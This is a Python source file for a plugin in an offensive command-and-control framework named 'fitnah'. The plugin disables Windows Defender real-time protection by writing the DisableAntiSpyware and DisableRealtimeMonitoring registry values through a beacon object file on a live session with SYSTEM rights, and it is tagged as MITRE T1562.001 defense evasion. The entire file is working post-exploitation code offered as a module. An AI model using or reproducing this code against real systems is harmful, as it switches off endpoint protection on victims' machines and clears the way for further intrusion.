"""defense_evasion/disable_defender — disable Defender real-time protection via reg BOF. MITRE T1562.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class DisableDefender(BasePlugin):
    NAME        = "disable_defender"
    DESCRIPTION = "Set DisableRealtimeMonitoring=1 via reg_set BOF. No PowerShell. Requires SYSTEM."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("enable", bool, required=False, default=False,
              help="If True, re-enable Defender (set to 0). Default False = disable."),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        val  = 0 if params.get("enable", False) else 1
        key  = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        name = "DisableAntiSpyware"
        args = ctx.bof_pack("zzi", key, name, val)
        r    = ctx.bof("reg_set", args_b64=args, timeout=15)
        if r["status"] != "ok":
            return ModuleResult.err(f"reg_set failed: {r['output']}")

        key2  = r"SOFTWARE\Microsoft\Windows Defender"
        name2 = "DisableRealtimeMonitoring"
        args2 = ctx.bof_pack("zzi", key2, name2, val)
        ctx.bof("reg_set", args_b64=args2, timeout=15)

        action = "disabled" if val == 1 else "re-enabled"
        return ModuleResult.ok(data=f"Defender {action} via registry BOF (requires SYSTEM)")
